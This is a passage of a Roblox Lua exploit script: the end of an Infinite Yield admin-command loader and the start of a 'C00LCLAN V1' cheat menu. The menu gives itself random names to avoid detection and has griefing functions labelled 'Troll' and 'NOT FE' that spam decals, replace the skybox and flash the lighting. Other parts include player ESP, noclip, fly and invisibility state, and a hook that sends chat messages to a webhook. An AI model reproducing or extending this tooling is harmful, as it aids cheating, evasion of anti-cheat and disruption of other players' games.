			QuickCapture.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
			QuickCapture.BackgroundTransparency = 0.14
			QuickCapture.Position = UDim2.new(0.489, 0, 0, 0)
			QuickCapture.Size = UDim2.new(0, 32, 0, 33)
			QuickCapture.Font = Enum.Font.SourceSansBold
			QuickCapture.Text = "IY"
			QuickCapture.TextColor3 = Color3.fromRGB(255, 255, 255)
			QuickCapture.TextSize = 20
			QuickCapture.TextWrapped = true
			QuickCapture.ZIndex = 10
			QuickCapture.Draggable = true
			UICorner.Name = randomString()
			UICorner.CornerRadius = UDim.new(0.5, 0)
			UICorner.Parent = QuickCapture
			QuickCapture.MouseButton1Click:Connect(function()
				Cmdbar:CaptureFocus()
				maximizeHolder()
			end)
			table.insert(shade1, QuickCapture)
			table.insert(text1, QuickCapture)
		end
	
		pcall(function() Scale.Scale = math.max(Holder.AbsoluteSize.X / 1920, guiScale) end)
		Scale.Parent = ScaledHolder
		ScaledHolder.Size = UDim2.fromScale(1 / Scale.Scale, 1 / Scale.Scale)
		Scale:GetPropertyChangedSignal("Scale"):Connect(function()
			ScaledHolder.Size = UDim2.fromScale(1 / Scale.Scale, 1 / Scale.Scale)
			for _, v in ScaledHolder:GetDescendants() do
				if v:IsA("GuiObject") and v.Visible then
					v.Visible = false
					v.Visible = true
				end
			end
		end)
	
		updateColors(currentShade1,shade1)
		updateColors(currentShade2,shade2)
		updateColors(currentShade3,shade3)
		updateColors(currentText1,text1)
		updateColors(currentText2,text2)
		updateColors(currentScroll,scroll)
	
		if PluginsTable ~= nil or PluginsTable ~= {} then
			FindPlugins(PluginsTable)
		end
	
		-- Events
		eventEditor.RegisterEvent("OnExecute")
		eventEditor.RegisterEvent("OnSpawn",{
			{Type="Player",Name="Player Filter ($1)"}
		})
		eventEditor.RegisterEvent("OnDied",{
			{Type="Player",Name="Player Filter ($1)"}
		})
		eventEditor.RegisterEvent("OnDamage",{
			{Type="Player",Name="Player Filter ($1)"},
			{Type="Number",Name="Below Health ($2)"}
		})
		eventEditor.RegisterEvent("OnKilled",{
			{Type="Player",Name="Victim Player ($1)"},
			{Type="Player",Name="Killer Player ($2)",Default = 1}
		})
		eventEditor.RegisterEvent("OnJoin",{
			{Type="Player",Name="Player Filter ($1)",Default = 1}
		})
		eventEditor.RegisterEvent("OnLeave",{
			{Type="Player",Name="Player Filter ($1)",Default = 1}
		})
		eventEditor.RegisterEvent("OnChatted",{
			{Type="Player",Name="Player Filter ($1)",Default = 1},
			{Type="String",Name="Message Filter ($2)"}
		})
	
		function hookCharEvents(plr,instant)
			task.spawn(function()
				local char = plr.Character
				if not char then return end
	
				local humanoid = char:WaitForChild("Humanoid",10)
				if not humanoid then return end
	
				local oldHealth = humanoid.Health
				humanoid.HealthChanged:Connect(function(health)
					local change = math.abs(oldHealth - health)
					if oldHealth > health then
						eventEditor.FireEvent("OnDamage",plr.Name,tonumber(health))
					end
					oldHealth = health
				end)
	
				humanoid.Died:Connect(function()
					eventEditor.FireEvent("OnDied",plr.Name)
	
					local killedBy = humanoid:FindFirstChild("creator")
					if killedBy and killedBy.Value and killedBy.Value.Parent then
						eventEditor.FireEvent("OnKilled",plr.Name,killedBy.Name)
					end
				end)
			end)
		end
	
		Players.PlayerAdded:Connect(function(plr)
			eventEditor.FireEvent("OnJoin",plr.Name)
			if isLegacyChat then plr.Chatted:Connect(function(msg) eventEditor.FireEvent("OnChatted",tostring(plr),msg) end) end
			plr.CharacterAdded:Connect(function() eventEditor.FireEvent("OnSpawn",tostring(plr)) hookCharEvents(plr) end)
			JoinLog(plr)
			if isLegacyChat then ChatLog(plr) end
			if ESPenabled then
				repeat wait(1) until plr.Character and getRoot(plr.Character)
				ESP(plr)
			end
			if CHMSenabled then
				repeat wait(1) until plr.Character and getRoot(plr.Character)
				CHMS(plr)
			end
		end)
	
		if not isLegacyChat then
			TextChatService.MessageReceived:Connect(function(message)
				if message.TextSource then
					local player = Players:GetPlayerByUserId(message.TextSource.UserId)
					if not player then return end
	
					if logsEnabled == true then
						CreateLabel(player.Name, message.Text)
					end
					if player.UserId == Players.LocalPlayer.UserId then
						do_exec(message.Text, Players.LocalPlayer)
					end
					eventEditor.FireEvent("OnChatted", player.Name, message.Text)
					sendChatWebhook(player, message.Text)
				end
			end)
		end
	
		for _,plr in pairs(Players:GetPlayers()) do
			pcall(function()
				plr.CharacterAdded:Connect(function() eventEditor.FireEvent("OnSpawn",tostring(plr)) hookCharEvents(plr) end)
				hookCharEvents(plr)
			end)
		end
	
		if spawnCmds and #spawnCmds > 0 then
			for i,v in pairs(spawnCmds) do
				eventEditor.AddCmd("OnSpawn",{v.COMMAND or "",{0},v.DELAY or 0})
			end
			updatesaves()
		end
	
		if loadedEventData then eventEditor.LoadData(loadedEventData) end
		eventEditor.Refresh()
	
		eventEditor.FireEvent("OnExecute")
	
		if aliases and #aliases > 0 then
			local cmdMap = {}
			for i,v in pairs(cmds) do
				cmdMap[v.NAME:lower()] = v
				for _,alias in pairs(v.ALIAS) do
					cmdMap[alias:lower()] = v
				end
			end
			for i = 1, #aliases do
				local cmd = string.lower(aliases[i].CMD)
				local alias = string.lower(aliases[i].ALIAS)
				if cmdMap[cmd] then
					customAlias[alias] = cmdMap[cmd]
				end
			end
			refreshaliases()
		end
	
		IYMouse.Move:Connect(checkTT)
	
		CaptureService.CaptureBegan:Connect(function()
			PARENT.Enabled = false
		end)
	
		CaptureService.CaptureEnded:Connect(function()
			task.delay(0.1, function()
				PARENT.Enabled = true
			end)
		end)
	
		task.spawn(function()
			local success, latestVersionInfo = pcall(function() 
				local versionJson = game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/version")
				return HttpService:JSONDecode(versionJson)
			end)
	
			if success then
				if currentVersion ~= latestVersionInfo.Version then
					notify("Outdated", "Get the new version at infyiff.github.io")
				end
	
				if latestVersionInfo.Announcement and latestVersionInfo.Announcement ~= "" then
					local AnnGUI = Instance.new("Frame")
					local background = Instance.new("Frame")
					local TextBox = Instance.new("TextLabel")
					local shadow = Instance.new("Frame")
					local PopupText = Instance.new("TextLabel")
					local Exit = Instance.new("TextButton")
					local ExitImage = Instance.new("ImageLabel")
	
					AnnGUI.Name = randomString()
					AnnGUI.Parent = ScaledHolder
					AnnGUI.Active = true
					AnnGUI.BackgroundTransparency = 1
					AnnGUI.Position = UDim2.new(0.5, -180, 0, -500)
					AnnGUI.Size = UDim2.new(0, 360, 0, 20)
					AnnGUI.ZIndex = 10
	
					background.Name = "background"
					background.Parent = AnnGUI
					background.Active = true
					background.BackgroundColor3 = currentShade1
					background.BorderSizePixel = 0
					background.Position = UDim2.new(0, 0, 0, 20)
					background.Size = UDim2.new(0, 360, 0, 150)
					background.ZIndex = 10
	
					TextBox.Parent = background
					TextBox.BackgroundTransparency = 1
					TextBox.Position = UDim2.new(0, 5, 0, 5)
					TextBox.Size = UDim2.new(0, 350, 0, 140)
					TextBox.Font = Enum.Font.SourceSans
					TextBox.TextSize = 18
					TextBox.TextWrapped = true
					TextBox.Text = latestVersionInfo.Announcement
					TextBox.TextColor3 = currentText1
					TextBox.TextXAlignment = Enum.TextXAlignment.Left
					TextBox.TextYAlignment = Enum.TextYAlignment.Top
					TextBox.ZIndex = 10
	
					shadow.Name = "shadow"
					shadow.Parent = AnnGUI
					shadow.BackgroundColor3 = currentShade2
					shadow.BorderSizePixel = 0
					shadow.Size = UDim2.new(0, 360, 0, 20)
					shadow.ZIndex = 10
	
					PopupText.Name = "PopupText"
					PopupText.Parent = shadow
					PopupText.BackgroundTransparency = 1
					PopupText.Size = UDim2.new(1, 0, 0.95, 0)
					PopupText.ZIndex = 10
					PopupText.Font = Enum.Font.SourceSans
					PopupText.TextSize = 14
					PopupText.Text = "Server Announcement"
					PopupText.TextColor3 = currentText1
					PopupText.TextWrapped = true
	
					Exit.Name = "Exit"
					Exit.Parent = shadow
					Exit.BackgroundTransparency = 1
					Exit.Position = UDim2.new(1, -20, 0, 0)
					Exit.Size = UDim2.new(0, 20, 0, 20)
					Exit.Text = ""
					Exit.ZIndex = 10
	
					ExitImage.Parent = Exit
					ExitImage.BackgroundColor3 = Color3.new(1, 1, 1)
					ExitImage.BackgroundTransparency = 1
					ExitImage.Position = UDim2.new(0, 5, 0, 5)
					ExitImage.Size = UDim2.new(0, 10, 0, 10)
					ExitImage.Image = getcustomasset("infiniteyield/assets/close.png")
					ExitImage.ZIndex = 10
	
					wait(1)
					AnnGUI:TweenPosition(UDim2.new(0.5, -180, 0, 150), "InOut", "Quart", 0.5, true, nil)
	
					Exit.MouseButton1Click:Connect(function()
						AnnGUI:TweenPosition(UDim2.new(0.5, -180, 0, -500), "InOut", "Quart", 0.5, true, nil)
						wait(0.6)
						AnnGUI:Destroy()
					end)
				end
			end
		end)
	
		task.spawn(function()
			wait()
			Credits:TweenPosition(UDim2.new(0, 0, 0.9, 0), "Out", "Quart", 0.2)
			Logo:TweenSizeAndPosition(UDim2.new(0, 175, 0, 175), UDim2.new(0, 37, 0, 45), "Out", "Quart", 0.3)
			wait(1)
			local OutInfo = TweenInfo.new(1.6809, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0)
			TweenService:Create(Logo, OutInfo, {ImageTransparency = 1}):Play()
			TweenService:Create(IntroBackground, OutInfo, {BackgroundTransparency = 1}):Play()
			Credits:TweenPosition(UDim2.new(0, 0, 0.9, 30), "Out", "Quart", 0.2)
			wait(0.2)
			Logo:Destroy()
			Credits:Destroy()
			IntroBackground:Destroy()
			minimizeHolder()
		end)
	end)
end;
task.spawn(C_a);
-- StarterGui.ScreenGui.Frame3.TextButton.LocalScript
local function C_c()
local script = G2L["c"];
	script.Parent.MouseButton1Click:Connect(function()
		--Services
		local Players = game:GetService("Players")
		local Player = Players.LocalPlayer
		local PlayerGui = Player:WaitForChild("PlayerGui")
		local UserInputService = game:GetService("UserInputService")
		local RunService = game:GetService("RunService")
		local PhysicsService = game:GetService("PhysicsService")
		local Character       = Player.Character or Player.CharacterAdded:Wait()
		local Humanoid        = Character:WaitForChild("Humanoid")
		local HRP             = Character:WaitForChild("HumanoidRootPart")
		local Mouse           = Player:GetMouse()
		local CollectionService = game:GetService("CollectionService")
		local RunService = game:GetService("RunService")
		local TeleportService = game:GetService("TeleportService")
		local HttpService = game:GetService("HttpService")
		local TweenService = game:GetService("TweenService")
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local MarketplaceService = game:GetService("MarketplaceService")
		local StarterGui = game:GetService("StarterGui")
		local Debris = game:GetService("Debris")
		local Lighting = game:GetService("Lighting")
		local SoundService = game:GetService("SoundService")
		local player = Player
	
		local PlaceId = game.PlaceId
		local JobId = game.JobId
		--settings
		local infjump = false
		local invisRunning = false
		local noclipOn = false
		local noclipConn
		local hoverHeight
		local bindFrame, bindConn, waitingBindFunction
		local customBinds = {}
		local infJumpEnabled = false
		local infJumpConnection = nil
		local espOn = false
		local spinOn = false
		local spinBAV, lockBP
		local savedCFrame
		local invisRunning = false
		local InvisibleCharacter = nil
		local OriginalCharacter = nil
		local voidConn = nil
		local flyingEnabled = false
		local invisRunning = false
		local flyBG, flyBV, flyConn
		local ray = workspace.CurrentCamera:ScreenPointToRay(Mouse.X, Mouse.Y)
		local hit, pos = workspace:FindPartOnRay(ray, Character)
		--GUI settings
		local GUI_WIDTH     = 400
		local GUI_HEIGHT    = 320
		local TITLE_HEIGHT  = 30
		local NAV_HEIGHT    = 30
		local FOOTER_HEIGHT = 30
		local GRID_PADDING  = 4
		local GRID_COLUMNS  = 4
	
		math.randomseed(os.time())
		local character_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	
		local string_sub = string.sub
		local math_random = math.random
		local table_concat = table.concat
		local character_set_amount = #character_set
		local number_one = 1
		local default_length = 10
	
	
	
		local function generate_string(length)
			local random_string = {}
	
			for int = number_one, length or default_length do
				local random_number = math_random(number_one, character_set_amount)
				local character = string_sub(character_set, random_number, random_number)
	
				random_string[#random_string + number_one] = character
			end
	
			return table_concat(random_string)
		end
		-- Function manager with descriptions
		local FunctionManager = {
			CategorizedFunctions = { All = {} },
			Categories          = { "All" },
			CurrentCategoryIndex= 1,
			Descriptions        = {},
			ISFE = {},
			OnFunctionAdded     = Instance.new("BindableEvent"),
		}
	
		function FunctionManager:register(name, callback, category, description, FE)
			category = category or "General"
			if not self.CategorizedFunctions[category] then
				self.CategorizedFunctions[category] = {}
				table.insert(self.Categories, category)
			end
			self.CategorizedFunctions[category][name] = callback
			self.CategorizedFunctions.All[name]        = callback
			self.Descriptions[name]                    = description or ""
			self.ISFE[name]                    = FE or "yes"
			if description == "NOT FE" then
				self.ISFE[name] = "no"
			end
			self.OnFunctionAdded:Fire(category, name, callback)
			self.OnFunctionAdded:Fire("All",      name, callback)
	
		end
	
		function FunctionManager:getCurrentCategory()
			return self.Categories[self.CurrentCategoryIndex]
		end
	
		function FunctionManager:cycleCategory()
			self.CurrentCategoryIndex = self.CurrentCategoryIndex % #self.Categories + 1
			return self:getCurrentCategory()
		end
	
	
	
		local screenGui = Instance.new("ScreenGui")
		screenGui.Name        = generate_string(math_random(1, 10))
		local die = screenGui.Name
		screenGui.ResetOnSpawn= false
		screenGui.Parent      = PlayerGui
		local notificationContainer = Instance.new("Frame")
		notificationContainer.Name = "NotificationContainer"
		notificationContainer.Size = UDim2.new(1, 0, 1, 0)
		notificationContainer.Position = UDim2.new(0, 0, 0, 0)
		notificationContainer.BackgroundTransparency = 1
		notificationContainer.ZIndex = 100
		notificationContainer.Parent = screenGui
		local function Notify(text, title, duration)
			duration = duration or 4
	
			local frame = Instance.new("Frame")
			frame.AnchorPoint = Vector2.new(1, 1)
			frame.Size = UDim2.new(0, 300, 0, 70)
			frame.Position = UDim2.new(1, 320, 1, -10)
			frame.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
			frame.BackgroundTransparency = 0
			frame.BorderSizePixel = 0
			frame.ZIndex = 200
			frame.Parent = notificationContainer
	
			local titleLabel = Instance.new("TextLabel")
			titleLabel.BackgroundTransparency = 1
			titleLabel.Size = UDim2.new(1, -10, 0, 24)
			titleLabel.Position = UDim2.new(0, 5, 0, 4)
			titleLabel.Font = Enum.Font.SourceSansBold
			titleLabel.Text = title or "Notice"
			titleLabel.TextColor3 = Color3.new(1, 1, 1)
			titleLabel.TextSize = 18
			titleLabel.TextXAlignment = Enum.TextXAlignment.Left
			titleLabel.ZIndex = 201
			titleLabel.Parent = frame
	
			local bodyLabel = Instance.new("TextLabel")
			bodyLabel.BackgroundTransparency = 1
			bodyLabel.Size = UDim2.new(1, -10, 1, -30)
			bodyLabel.Position = UDim2.new(0, 5, 0, 28)
			bodyLabel.Font = Enum.Font.SourceSans
			bodyLabel.Text = text or ""
			bodyLabel.TextColor3 = Color3.new(1, 1, 1)
			bodyLabel.TextSize = 14
			bodyLabel.TextWrapped = true
			bodyLabel.TextXAlignment = Enum.TextXAlignment.Left
			bodyLabel.ZIndex = 201
			bodyLabel.Parent = frame
	
			task.defer(function()
				local slideIn = TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
					Position = UDim2.new(1, -10, 1, -10)
				})
				slideIn:Play()
			end)
	
	
			task.delay(duration, function()
				local fadeOut = TweenService:Create(frame, TweenInfo.new(0.3), {
					BackgroundTransparency = 1,
					Position = UDim2.new(1, 320, 1, -10)
				})
				local titleFade = TweenService:Create(titleLabel, TweenInfo.new(0.3), {TextTransparency = 1})
				local bodyFade = TweenService:Create(bodyLabel, TweenInfo.new(0.3), {TextTransparency = 1})
	
				fadeOut:Play()
				titleFade:Play()
				bodyFade:Play()
	
				fadeOut.Completed:Wait()
				frame:Destroy()
			end)
		end
	
	
	
	
		local notificationLayout = Instance.new("UIListLayout")
		notificationLayout.SortOrder = Enum.SortOrder.LayoutOrder
		notificationLayout.Padding = UDim.new(0, 6)
		notificationLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
		notificationLayout.VerticalAlignment = Enum.VerticalAlignment.Bottom
		notificationLayout.Parent = notificationContainer
		Notify("Welcome to C00lClan!", "Have fun!", 3)
		-- Main frame
		local mainFrame = Instance.new("Frame")
		mainFrame.Name            = generate_string(math_random(1, 10))
		mainFrame.Size            = UDim2.new(0, GUI_WIDTH, 0, GUI_HEIGHT)
		mainFrame.Position        = UDim2.new(0.5, -GUI_WIDTH/2, 0.5, -GUI_HEIGHT/2)
		mainFrame.BackgroundColor3= Color3.fromRGB(25, 5, 5)
		mainFrame.BorderSizePixel = 0
		mainFrame.Parent          = screenGui
	
		-- Tooltip
		local tooltip = Instance.new("TextLabel", screenGui)
		tooltip.Name               = generate_string(math_random(1, 10))
		tooltip.Size               = UDim2.new(0, 200, 0, 40)
		tooltip.BackgroundColor3   = Color3.fromRGB(30,30,30)
		tooltip.BorderSizePixel    = 0
		tooltip.Visible            = false
		tooltip.ZIndex             = 100
		tooltip.ClipsDescendants   = false
		tooltip.TextColor3 = Color3.fromRGB(255, 255, 255)
		tooltip.TextWrapped = true
		-- Title bar
		local titleBar = Instance.new("Frame", mainFrame)
		titleBar.Name             = generate_string(math_random(1, 10))
		titleBar.Size             = UDim2.new(1,0,0,TITLE_HEIGHT)
		titleBar.BackgroundColor3 = Color3.fromRGB(60,0,0)
		titleBar.BorderSizePixel  = 0
	
		local titleLabel = Instance.new("TextLabel", titleBar)
		titleLabel.Size           = UDim2.new(1,-60,1,0)
		titleLabel.Position       = UDim2.new(0,4,0,0)
		titleLabel.BackgroundTransparency = 1
		titleLabel.Text           = "C00LCLAN V1"
		titleLabel.Font           = Enum.Font.SourceSansBold
		titleLabel.TextSize       = 18
		titleLabel.TextColor3     = Color3.new(1,1,1)
		titleLabel.TextXAlignment = Enum.TextXAlignment.Left
		titleLabel.Name           = generate_string(math_random(1, 10))
	
		local minBtn = Instance.new("TextButton", titleBar)
		minBtn.Name               = generate_string(math_random(1, 10))
		minBtn.Size               = UDim2.new(0,30,1,0)
		minBtn.Position           = UDim2.new(1,-30,0,0)
		minBtn.Text               = "_"
		minBtn.Font               = Enum.Font.SourceSansBold
		minBtn.TextSize           = 18
		minBtn.TextColor3         = Color3.new(1,1,1)
		minBtn.BackgroundColor3   = Color3.fromRGB(80,10,10)
		minBtn.BorderSizePixel    = 0
	
		-- Drag logic
		local dragging, dragInput, dragStart, startPos = false, nil
		local function updateDrag(input)
			local delta = input.Position - dragStart
			mainFrame.Position = startPos + UDim2.new(0, delta.X, 0, delta.Y)
		end
		titleBar.InputBegan:Connect(function(i)
			if i.UserInputType==Enum.UserInputType.MouseButton1 then
				dragging, dragStart, startPos = true, i.Position, mainFrame.Position
				i.Changed:Connect(function()
					if i.UserInputState==Enum.UserInputState.End then dragging=false end
				end)
			end
		end)
		titleBar.InputChanged:Connect(function(i)
			if i.UserInputType==Enum.UserInputType.MouseMovement then dragInput=i end
		end)
		UserInputService.InputChanged:Connect(function(i)
			if i==dragInput and dragging then updateDrag(i) end
		end)
	
		-- Category nav
		local catNav = Instance.new("Frame", mainFrame)
		catNav.Name               = generate_string(math_random(1, 10))
		catNav.Size               = UDim2.new(1,0,0,NAV_HEIGHT)
		catNav.Position           = UDim2.new(0,0,0,TITLE_HEIGHT)
		catNav.BackgroundTransparency = 1
	
		local leftCat = Instance.new("TextButton", catNav)
		leftCat.Size              = UDim2.new(0,50,1,0)
		leftCat.Text              = "<"
		leftCat.Font              = Enum.Font.SourceSansBold
		leftCat.TextSize          = 24
		leftCat.TextColor3        = Color3.new(1,1,1)
		leftCat.BackgroundColor3  = Color3.fromRGB(100,0,0)
		leftCat.BorderSizePixel   = 0
		leftCat.Name              = generate_string(math_random(1, 10))
		local catLabel = Instance.new("TextLabel", catNav)
		catLabel.Size             = UDim2.new(1,-100,1,0)
		catLabel.Position         = UDim2.new(0,50,0,0)
		catLabel.BackgroundTransparency = 1
		catLabel.Text             = "All"
		catLabel.Font             = Enum.Font.SourceSansBold
		catLabel.TextSize         = 18
		catLabel.TextColor3       = Color3.new(1,1,1)
		catNav.Name               = generate_string(math_random(1, 10))
		local rightCat = leftCat:Clone()
		rightCat.Parent           = catNav
		rightCat.Position         = UDim2.new(1,-50,0,0)
		rightCat.Text             = ">"
		rightCat.Name = generate_string(math_random(1, 10))
	
		-- Grid
		local gridFrame = Instance.new("ScrollingFrame", mainFrame)
		gridFrame.Name            = generate_string(math_random(1, 10))
		gridFrame.ClipsDescendants= true
		gridFrame.Size            = UDim2.new(1,-2*GRID_PADDING,0,GUI_HEIGHT-TITLE_HEIGHT-NAV_HEIGHT-FOOTER_HEIGHT-2*GRID_PADDING)
		gridFrame.Position        = UDim2.new(0,GRID_PADDING,0,TITLE_HEIGHT+NAV_HEIGHT+GRID_PADDING)
		gridFrame.BackgroundTransparency = 1
	
		local gridLayout = Instance.new("UIGridLayout", gridFrame)
		gridLayout.Name           = generate_string(math_random(1, 10))
		gridLayout.CellSize       = UDim2.new(0,(GUI_WIDTH-2*GRID_PADDING-(GRID_COLUMNS-1)*GRID_PADDING)/GRID_COLUMNS,0,40)
		gridLayout.CellPadding    = UDim2.new(0,GRID_PADDING,0,GRID_PADDING)
		gridLayout.SortOrder      = Enum.SortOrder.LayoutOrder
	
		-- Footer
		local footer = Instance.new("Frame", mainFrame)
		footer.Name               = generate_string(math_random(1, 10))
		footer.Size               = UDim2.new(1,0,0,FOOTER_HEIGHT)
		footer.Position           = UDim2.new(0,0,1,-FOOTER_HEIGHT)
		footer.BackgroundTransparency = 1
	
		local closeBtn = Instance.new("TextButton", footer)
		closeBtn.Size             = UDim2.new(1,0,1,0)
		closeBtn.Text             = "Close"
		closeBtn.Font             = Enum.Font.SourceSansBold
		closeBtn.TextSize         = 18
		closeBtn.TextColor3       = Color3.new(1,1,1)
		closeBtn.BackgroundColor3 = Color3.fromRGB(100,0,0)
		closeBtn.BorderSizePixel  = 0
		closeBtn.Name             = generate_string(math_random(1, 10))
		-- Minimize toggle
		local minimized = false
		minBtn.MouseButton1Click:Connect(function()
			minimized = not minimized
			if minimized == true then
				mainFrame.BackgroundTransparency = 1
			else
				mainFrame.BackgroundTransparency = 0
			end
			gridFrame.Visible     = not minimized
			catNav.Visible        = not minimized
			footer.Visible        = not minimized
			minBtn.Text           = minimized and "◻" or "_"
		end)
		local function NotifyERROR(text)
			Notify(text, "ERROR", 3)
		end
		-- Build the grid and tooltips
		local function updateGrid()
			for _, c in ipairs(gridFrame:GetChildren()) do
				if c:IsA("TextButton") then c:Destroy() end
			end
			local cat = FunctionManager:getCurrentCategory()
			catLabel.Text = cat
	
			for name, cb in pairs(FunctionManager.CategorizedFunctions[cat]) do
				local btn = Instance.new("TextButton")
				local isFE = FunctionManager.ISFE[name]
				btn.Size             = UDim2.new(1,0,0,40)
				btn.BackgroundColor3 = Color3.fromRGB(70,10,10)
				btn.BorderSizePixel  = 0
				btn.Font             = Enum.Font.SourceSansBold
				btn.TextSize         = 16
				btn.TextColor3       = Color3.new(1,1,1)
				btn.Text             = name
				btn.TextWrapped      = true
				btn.Parent           = gridFrame
				btn.Name             = generate_string(math_random(1, 10))
				if isFE == "no" then
					btn.BackgroundColor3 = Color3.fromRGB(72, 100, 87)
				end
				-- tooltip
				local desc = FunctionManager.Descriptions[name]
	
				btn.MouseMoved:Connect(function()
					if desc ~= "" and desc ~= nil then
						tooltip.Text     = desc
						tooltip.Position = UDim2.new(0,Mouse.X,0,Mouse.Y - tooltip.Size.Y.Offset - 4)
						tooltip.Visible = true
					end
				end)
				btn.MouseLeave:Connect(function() tooltip.Visible = false end)
	
				btn.MouseButton1Click:Connect(function()
					pcall(cb)
				end)
			end
		end
		local logo = Instance.new("ImageLabel")
		logo.Name                 = generate_string(math_random(1, 10))
		logo.BackgroundTransparency = 1
		logo.Size                 = UDim2.new(1, 0, 0, 100)
		logo.Position             = UDim2.new(0, -50, 0, -100)
		logo.Image                = "rbxassetid://87486058304609"
		logo.ScaleType            = Enum.ScaleType.Fit              
		logo.Parent               = mainFrame
		-- nav buttons
		leftCat.MouseButton1Click:Connect(function()
			FunctionManager.CurrentCategoryIndex = (FunctionManager.CurrentCategoryIndex - 2) % #FunctionManager.Categories + 1
			updateGrid()
		end)
		rightCat.MouseButton1Click:Connect(function()
			FunctionManager:cycleCategory()
			updateGrid()
		end)
		closeBtn.MouseButton1Click:Connect(function()
			screenGui:Destroy()
		end)
		FunctionManager.OnFunctionAdded.Event:Connect(updateGrid)
	
	
	
		-- Initialize
		updateGrid()
	
		FunctionManager:register("Decal Spam", function()
			local decalID = 8408806737
			local function exPro(root)
				for _, v in pairs(root:GetChildren()) do
					if v:IsA("Decal") and v.Texture ~= "http://www.roblox.com/asset/?id="..decalID then
						v.Parent = nil
					elseif v:IsA("BasePart") then
						v.Material = "Plastic"
						v.Transparency = 0
						local One = Instance.new("Decal", v)
						local Two = Instance.new("Decal", v)
						local Three = Instance.new("Decal", v)
						local Four = Instance.new("Decal", v)
						local Five = Instance.new("Decal", v)
						local Six = Instance.new("Decal", v)
						One.Texture = "http://www.roblox.com/asset/?id="..decalID
						Two.Texture = "http://www.roblox.com/asset/?id="..decalID
						Three.Texture = "http://www.roblox.com/asset/?id="..decalID
						Four.Texture = "http://www.roblox.com/asset/?id="..decalID
						Five.Texture = "http://www.roblox.com/asset/?id="..decalID
						Six.Texture = "http://www.roblox.com/asset/?id="..decalID
						One.Face = "Front"
						Two.Face = "Back"
						Three.Face = "Right"
						Four.Face = "Left"
						Five.Face = "Top"
						Six.Face = "Bottom"
					end
					exPro(v)
				end
			end
			local function asdf(root)
				for _, v in pairs(root:GetChildren()) do
					asdf(v)
				end
			end
			exPro(game.Workspace)
			asdf(game.Workspace)
	
			local s = Instance.new("Sky")
			s.Name = "Sky"
			s.Parent = game.Lighting
			local skyboxID = 8408806737
			s.SkyboxBk = "http://www.roblox.com/asset/?id="..skyboxID
			s.SkyboxDn = "http://www.roblox.com/asset/?id="..skyboxID
			s.SkyboxFt = "http://www.roblox.com/asset/?id="..skyboxID
			s.SkyboxLf = "http://www.roblox.com/asset/?id="..skyboxID
			s.SkyboxRt = "http://www.roblox.com/asset/?id="..skyboxID
			s.SkyboxUp = "http://www.roblox.com/asset/?id="..skyboxID
			game.Lighting.TimeOfDay = 12
	
			for i, v in pairs(game.Players:GetChildren()) do
				local emit = Instance.new("ParticleEmitter")
				emit.Parent = v.Character.Torso
				emit.Texture = "http://www.roblox.com/asset/?id=8408806737"
				emit.VelocitySpread = 20
			end
			for i, v in pairs(game.Players:GetChildren()) do
				local emit = Instance.new("ParticleEmitter")
				emit.Parent = v.Character.Torso
				emit.Texture = "http://www.roblox.com/asset/?id=8408806737"
				emit.VelocitySpread = 20
			end
			for i, v in pairs(game.Players:GetChildren()) do
				local emit = Instance.new("ParticleEmitter")
				emit.Parent = v.Character.Torso
				emit.Texture = "http://www.roblox.com/asset/?id=8408806737"
				emit.VelocitySpread = 20
			end
			while true do
				game.Lighting.Ambient = Color3.new(math.random() , math.random() , math.random())
				wait(0.2)
				game.Lighting.ShadowColor = Color3.new(math.random() , math.random() , math.random())
				wait(0.2) 
			end
		end, "Troll", "NOT FE")
		FunctionManager:register("JOHN DOE", function()
	
			local redSkyboxAssetId = "rbxassetid://1012887"
			local sky = Lighting:FindFirstChildOfClass("Sky")
			if not sky then
				sky = Instance.new("Sky", Lighting)
			end
			sky.SkyboxBk = redSkyboxAssetId
			sky.SkyboxDn = redSkyboxAssetId
			sky.SkyboxFt = redSkyboxAssetId
			sky.SkyboxLf = redSkyboxAssetId
			sky.SkyboxRt = redSkyboxAssetId
			sky.SkyboxUp = redSkyboxAssetId
	
			if not ReplicatedStorage:FindFirstChild("juisdfj0i32i0eidsuf0iok") then
				local detection = Instance.new("Decal")
				detection.Name = "juisdfj0i32i0eidsuf0iok"
				detection.Parent = ReplicatedStorage
			end
	
			local screenGui = Instance.new("ScreenGui")
			screenGui.Name = "PersistentSoundGui"
			screenGui.ResetOnSpawn = false
			screenGui.Parent = player:WaitForChild("PlayerGui")
	
			local button = Instance.new("TextButton")
			button.Size = UDim2.new(0, 150, 0, 50)
			button.Position = UDim2.new(0.02, 0, 0.477, 0)
			button.Text = "Sound Toggle"
			button.Font = Enum.Font.SourceSansBold
			button.TextSize = 20
			button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
			button.TextColor3 = Color3.new(1, 1, 1)
			button.Parent = screenGui
	
			local backgroundSound = SoundService:FindFirstChild("PersistentBGSound")
			if not backgroundSound then
				backgroundSound = Instance.new("Sound")
				backgroundSound.Name = "PersistentBGSound"
				backgroundSound.SoundId = "rbxassetid://19094700"
				backgroundSound.PlaybackSpeed = 0.221
				backgroundSound.Looped = true
				backgroundSound.Volume = 1
				backgroundSound.Parent = SoundService
				backgroundSound:Play()
			end
	
			button.Activated:Connect(function()
				backgroundSound.Playing = not backgroundSound.Playing
			end)
	
			local function setupCharacter(character)
				local humanoid = character:WaitForChild("Humanoid")
				local torso = character:WaitForChild("Torso")
				local hrp = character:WaitForChild("HumanoidRootPart")
	
				local tool = Instance.new("Tool")
				tool.Name = "Slash"
				tool.RequiresHandle = false
				tool.Parent = player.Backpack
	
				tool.Activated:Connect(function()
					local animation = Instance.new("Animation")
					animation.AnimationId = "rbxassetid://186934658"
					local track = humanoid:LoadAnimation(animation)
					track:Play()
					track:AdjustSpeed(2)
	
					local s = Instance.new("Sound", torso)
					s.SoundId = "rbxassetid://28144425"
					s:Play()
	
					task.wait(0.2)
	
					local s2 = Instance.new("Sound", torso)
					s2.SoundId = "rbxassetid://429400881"
					s2.Volume = 0.2
					s2:Play()
				end)
	
				local naeeym = Instance.new("BillboardGui", character)
				naeeym.Size = UDim2.new(0, 100, 0, 40)
